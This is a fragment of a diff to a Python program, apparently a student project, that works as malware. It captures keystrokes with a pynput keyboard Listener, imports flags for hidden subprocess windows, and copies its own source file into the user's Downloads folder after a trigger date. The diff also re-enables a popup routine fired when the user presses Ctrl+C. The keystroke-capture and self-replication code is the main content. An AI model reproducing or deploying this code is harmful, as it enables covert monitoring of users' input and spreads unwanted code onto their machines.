@@ -1,7 +1,6 @@
 # File imports
-from concurrent.futures import ThreadPoolExecutor
 from pynput.keyboard import Listener
-from pynput import keyboard
+
 
 import threading as th
 from subprocess import PIPE, STARTUPINFO, STARTF_USESHOWWINDOW
@@ -47,7 +46,7 @@ totalsec = (hour*3600) + (min*60) + sec
 
 #   Specify routes to replicate itself
 cPath = "C:\\Users\\angel\\Desktop\\ProyectoFinal\\main.py"
-dPath = "C:\\Users\\angel\\Downloads"
+dPath = "C:\\Users\\angel\\Downloads\\"
 
 # variables
 rar = 0
@@ -63,10 +62,8 @@ def getdate():
 
 def checkDT():
     if vr.dt[:10] == str(date)[:10] and time.time() > totalsec:
-        print("toy por aqui")
         if os.path.exists(dPath):
             # copy yourself
-            print("toy por aca")
             os.popen(f"copy {cPath} {dPath}")
 
 #   Ex. 2
@@ -157,7 +154,7 @@ def vkey(key):
         k = key.replace("'", "").replace("\\", "")
         if k == "x03":  # Ctrl + C
             print("llegué")
-            # popups()
+            popups()
         elif k == "x16":  # Ctrl + V
             print("Entré")
             if rar == 0:
